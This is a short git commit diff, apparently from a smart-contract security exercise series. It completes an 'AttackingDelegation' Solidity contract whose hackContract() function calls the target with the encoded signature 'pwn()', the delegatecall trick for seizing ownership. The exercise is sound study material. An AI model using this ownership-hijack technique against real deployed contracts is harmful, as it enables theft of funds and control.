4f999e0c9526b21ed8a21213c34c7a0e0625502f
Yuehan Duan <yuehanduan@Yuehans-MacBook-Pro.local>
2023-01-21 01:30:49 +0100

    Hack delegation contrack

--- contracts/2. Delegation/AttackingDelegation.sol
+++ contracts/2. Delegation/AttackingDelegation.sol
@@ -3,13 +3,13 @@ pragma solidity ^0.8.9;
 import "./Delegation.sol";
 
 contract AttackingDelegation {
-    address public contractAddress;
+    address public delegation;
 
-    constructor(address _contractAddress) {
-        contractAddress = _contractAddress;
+    constructor(address _delegation) {
+        delegation = _delegation;
     }
 
     function hackContract() external {
-        // Code me!
+        delegation.call(abi.encodeWithSignature("pwn()"));
     }
 }
